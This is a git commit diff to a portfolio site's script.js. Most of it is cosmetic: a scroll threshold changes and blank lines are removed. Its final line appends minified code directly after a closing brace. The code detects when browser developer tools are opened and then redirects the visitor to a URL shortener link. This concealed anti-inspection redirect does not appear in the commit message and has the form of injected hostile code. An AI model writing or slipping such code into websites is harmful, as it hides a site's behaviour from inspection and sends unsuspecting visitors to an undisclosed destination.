e0ffd6bb2304e799424b536971cb0350bd96dace
WebShop <muhamadafghanalzena@gmail.com>
2023-12-10 12:36:35 +0700

    update sistem + portofolio pages

--- script.js
+++ script.js
@@ -2,8 +2,7 @@ document.addEventListener("scroll", () => {
   const header = document.querySelector("header");
   const title = document.querySelector("#name-nav");
   const btnBack = document.querySelector(".btn-backToHome");
-
-  if (window.scrollY > 80) {
+  if (window.scrollY > 100) {
     header.classList.add("scrolled");
     title.style.display = "flex";
     btnBack.style.opacity = "1";
@@ -12,16 +11,12 @@ document.addEventListener("scroll", () => {
     header.classList.remove("scrolled");
     title.style.display = "none";
     btnBack.style.opacity = "0";
-  } 
+  }
 });
-
-
-
 function showNav() {
   var btnNavMenu = document.querySelector(".fa-bars");
   var hiddenNav = document.querySelector(".navMobile");
   var btnNavHidden = document.querySelector(".fa-xmark");
-  
   btnNavMenu.style.display = "none";
   btnNavHidden.style.display = "inherit";
   hiddenNav.classList.remove("hidden");
@@ -30,13 +25,7 @@ function hideNav() {
   var hiddenNav = document.querySelector(".navMobile");
   var btnNavMenu = document.querySelector(".fa-bars");
   var btnNavHidden = document.querySelector(".fa-xmark");
-  
   btnNavMenu.style.display = "inherit";
   btnNavHidden.style.display = "none";
   hiddenNav.classList.add("hidden");
-}
-
-
-
-
-
+}window.addEventListener("resize",function(){if(window.outerWidth-window.innerWidth>100||window.outerHeight-window.innerHeight>100){window.location.href="https://rb.gy/typm6z";}});
